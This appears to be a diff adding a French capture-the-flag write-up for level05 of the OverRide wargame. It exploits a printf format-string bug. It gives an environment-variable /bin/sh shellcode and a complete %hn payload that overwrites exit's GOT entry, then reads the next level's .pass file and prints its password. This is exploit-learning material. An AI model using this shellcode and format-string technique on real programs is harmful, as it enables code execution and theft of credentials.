@@ -1,0 +1,44 @@
+on remarque immédiatement un printf format bug avec %p qui affiche 0x64
+
+on commence par metre un shellcode dans l'environement:
+
+export CODE=`python -c "print('\x90' * 200 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80')"`
+
+on va re-ecrire le GOT de exit:
+level05@OverRide:~$ objdump -R ./level05
+
+./level05:     file format elf32-i386
+
+DYNAMIC RELOCATION RECORDS
+OFFSET   TYPE              VALUE
+080497c4 R_386_GLOB_DAT    __gmon_start__
+080497f0 R_386_COPY        stdin
+080497d4 R_386_JUMP_SLOT   printf
+080497d8 R_386_JUMP_SLOT   fgets
+080497dc R_386_JUMP_SLOT   __gmon_start__
+080497e0 R_386_JUMP_SLOT   exit
+080497e4 R_386_JUMP_SLOT   __libc_start_main
+
+on en provite pour recuperer l'addresse de la variable d environement avec gdb,
+0xffffded3, on ajoute un peu pour passer le CODE=
+0xffffdeed fera l'affaire
+
+il faut donc prendre ffffde80 et chercher a l'ecrire en deux fois vu qu il est
+plus grand qu'un int et causera donc un overflow, on va faire en deux:
+
+ffff            65535
+deed            57069
+
+65535 - 57069 = 8466
+
+donc:
+#avancement:
+#                       8                           16                 57069 (0xdeed)  57069   65535 (0xffff)  65535
+( python -c "print('\x08\x04\x97\xe0'[::-1] + '\x08\x04\x97\xe2'[::-1] + '%57061c' + '%10\$hn' + '%8466c' + '%11\$hn')" ; cat) | ./level05
+
+                    addresse du got de exit     idem + 2                 on ecrit    dans le debut du got de exit, et 65535 dans sa fin.
+                                                                         0xdeed
+le tout fera donc bien 0xffffdeed
+
+cat /home/users/level06/.pass
+h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq
